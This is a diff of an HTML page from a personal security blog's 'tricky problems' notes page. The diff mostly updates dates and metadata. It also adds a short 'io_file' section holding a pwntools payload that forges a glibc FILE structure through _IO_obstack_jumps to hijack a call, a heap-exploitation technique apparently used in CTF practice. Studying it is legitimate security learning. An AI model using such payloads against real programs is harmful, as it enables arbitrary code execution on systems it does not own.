@@ -9,7 +9,7 @@
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://cnitlrt.github.io/misc/" /><meta property="og:image" content="https://cnitlrt.github.io/logo.jpg"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-01-01T04:06:14+08:00" />
-<meta property="article:modified_time" content="2024-11-07T15:28:07+08:00" /><meta property="og:site_name" content="My cool site" />
+<meta property="article:modified_time" content="2024-11-09T15:56:04+08:00" /><meta property="og:site_name" content="My cool site" />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://cnitlrt.github.io/logo.jpg"/>
 
@@ -34,8 +34,8 @@
                             "url": "https:\/\/cnitlrt.github.io\/images\/Apple-Devices-Preview.png",
                             "width":  3200 ,
                             "height":  2048 
-                        }],"genre": "posts","keywords": "tools","wordcount":  20400 ,
-        "url": "https:\/\/cnitlrt.github.io\/misc\/","datePublished": "2022-01-01T04:06:14+08:00","dateModified": "2024-11-07T15:28:07+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+                        }],"genre": "posts","keywords": "tools","wordcount":  20453 ,
+        "url": "https:\/\/cnitlrt.github.io\/misc\/","datePublished": "2022-01-01T04:06:14+08:00","dateModified": "2024-11-09T15:56:04+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
                     "@type": "ImageObject",
@@ -113,7 +113,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">疑难杂症宝典</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>cnitlrt</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/tools/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>tools</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-01-01">2022-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 20400 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-01-01">2022-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 20453 字&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 41 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
@@ -124,6 +124,7 @@
   <ul>
     <li>
       <ul>
+        <li><a href="#io_file">io_file</a></li>
         <li><a href="#libc-got-hijack修改的位置">libc got hijack修改的位置</a></li>
         <li><a href="#ubuntu安装picgo-core">ubuntu安装picgo-core</a></li>
         <li><a href="#ida-搜索正则表达式">ida 搜索正则表达式</a></li>
@@ -441,7 +442,44 @@
     </li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><h2 id="libc-got-hijack修改的位置">libc got hijack修改的位置</h2>
+            </div><div class="content" id="content"><h2 id="io_file">io_file</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x18</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x20</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x28</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x30</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x38</span><span class="o">:</span> <span class="mh">0x1234</span><span class="p">,</span><span class="c1">//call
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="mh">0x48</span><span class="o">:</span> <span class="mh">0x4567</span><span class="p">,</span><span class="c1">//rdi
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="mh">0x50</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x68</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xD8</span><span class="o">:</span> <span class="mh">0x2173C0</span> <span class="o">+</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span><span class="c1">//IO_obstack_jumps + 0x20
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="mh">0xE0</span><span class="o">:</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x3E0</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span><span class="c1">//this_mem_address
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filler</span><span class="o">=</span><span class="s">&#34;</span><span class="se">\x00</span><span class="s">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="libc-got-hijack修改的位置">libc got hijack修改的位置</h2>
 <p>修改strlen_got （通常为0x98）为</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -8433,8 +8471,8 @@ seccomp-tools asm rule.asm -a amd64  -f carray</p>
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>更新于 2024-11-07&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/fdeb7579c00bdf86d70aaa679d6d2e5f4be9b7b4" target="_blank" title="commit by cnitlrt(cnitlrt@gmail.com) fdeb7579c00bdf86d70aaa679d6d2e5f4be9b7b4: blog">
-                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>fdeb757</a></span>
+                <span>更新于 2024-11-09&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/5f28ddec3c358cce29bca5eb19084b51ed3c2059" target="_blank" title="commit by cnitlrt(cnitlrt@gmail.com) 5f28ddec3c358cce29bca5eb19084b51ed3c2059: blog">
+                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>5f28dde</a></span>
             </div></div>
         <div class="post-info-line">
             <div class="post-info-md"></div>
